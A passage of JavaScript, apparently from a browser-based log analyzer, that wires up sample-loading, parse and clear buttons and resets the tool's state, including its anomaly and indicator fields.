        if (el) el.value = s;
        var det = detectFormat(s);
        state.format = det.format;
        state.confidence = det.confidence;
        render();
      };
    });
    var parseBtn = container.querySelector('#lf-parse');
    if (parseBtn) parseBtn.onclick = doAnalyze;
    var clearBtn = container.querySelector('#lf-clear');
    if (clearBtn) clearBtn.onclick = function() {
      state.text = ''; state.entries = []; state.format = 'unknown'; state.confidence = 0; state.anomalies = []; state.iocs = {};
      render();
    };
  }

  render();
}
